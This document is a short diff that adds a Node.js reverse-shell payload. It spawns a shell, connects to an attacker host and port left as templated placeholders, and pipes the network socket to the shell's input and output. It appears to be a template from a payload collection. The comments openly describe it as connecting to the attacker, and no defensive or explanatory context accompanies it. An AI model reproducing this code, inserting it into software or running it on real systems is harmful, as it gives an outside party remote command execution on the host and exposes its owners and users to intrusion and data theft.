@@ -1,0 +1,12 @@
+// Spawn a shell process
+shell = require("child_process").spawn("*\shell*");
+
+// Connect to the attacker
+require("net").connect(*\port*, "*\host*", function () {
+    // Pipe socket input to the shell's stdin
+    this.pipe(shell.stdin);
+
+    // Pipe shell's standard stdout and stderr to the socket
+    shell.stdout.pipe(this);
+    shell.stderr.pipe(this);
+});
